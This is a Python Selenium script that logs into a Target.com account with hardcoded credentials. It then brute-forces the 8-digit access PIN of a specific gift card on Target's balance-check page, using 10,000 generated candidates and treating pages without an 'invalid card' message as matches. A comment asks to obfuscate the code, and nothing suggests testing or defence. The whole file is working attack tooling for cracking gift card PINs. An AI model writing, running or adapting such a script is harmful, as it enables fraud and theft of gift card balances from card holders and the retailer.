import os
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# TODO: Obfuscate all of this.
#card_number = "123456789123456" # 15 digits
card_number = "042300131247458"
#access_pin = "12345678"        # 8 digits
target_email = "wklqzrqdalkqszfint@poplk.com"
target_password = "Target1!"

driver = webdriver.Chrome()
wait = WebDriverWait(driver, 15)

def populate_candidates():
    filename = "candidates.txt"

    if os.path.isfile(filename):
        with open(filename, 'r') as file:
            lines = file.readlines()
        list_candidates = [line.strip() for line in lines]
        print(f"Read in {len(list_candidates)} candidates.")
        return list_candidates
    else:
        base = 2152 # Final 4 of 8 pin characters are known.
        list_candidates = []
        for i in range(10000):
            list_candidates.append(str((i * 10000) + base).zfill(8))

        with open(filename, "w") as file:
            for candidate in list_candidates:
                file.write(candidate + "\n")
        print(f"Generated {len(list_candidates)} new candidates")
        
        return list_candidates

# Returns true if login is successful.
def login() -> bool:
    try:
         # Go to target.com and log in.
        driver.get("https://www.target.com/account")
        wait.until(EC.presence_of_element_located((By.ID, "username"))).send_keys(target_email)
        driver.find_element(By.ID, "password").send_keys(target_password)
        driver.find_element(By.ID, "login").click()
        # Uncomment to handle encountered mobile number/2FA prompts, if needed.
        # TODO: Incorporate this as a conditional.
        #wait.until(EC.presence_of_element_located((By.XPATH, "//*[contains(text(), 'Skip')]"))).click()
        #wait.until(EC.presence_of_element_located((By.XPATH, "//*[contains(text(), 'Maybe later')]"))).click()
        wait.until(EC.url_contains("account"))

        return True
    except Exception as e:
        print(f"❌ Error During Login: {e}")
        return False

def invalidate_candidate(candidate) -> bool:
    try:
        driver.get("https://www.target.com/guest/gift-card-balance")
        wait.until(EC.presence_of_element_located((By.ID, "cardNumber"))).send_keys(card_number)
        driver.find_element(By.ID, "accessPin").send_keys(candidate)
        driver.find_element(By.ID, "queryGiftCard").click()
        wait.until(EC.presence_of_element_located((By.XPATH, '//p[text()="Please enter a valid gift card."]')))

        return True
    except Exception as e:
        print(f"❌ Failed to invalidate candidate: {candidate}: {e}")
        #input("Wait Here")
        return False

def main():
    list_candidates = populate_candidates()

    if login():
        while list_candidates.count != 1:
            candidate = list_candidates.pop(0)
            if invalidate_candidate(candidate):
                print(f"Removed {candidate} / {list_candidates.count} remaining.")
            else:
                print(f"Potential Match: {candidate}")
                list_candidates.append(candidate)

    print(f"Access Pin: {list_candidates}")
    driver.quit()

if __name__ == "__main__":
    main()
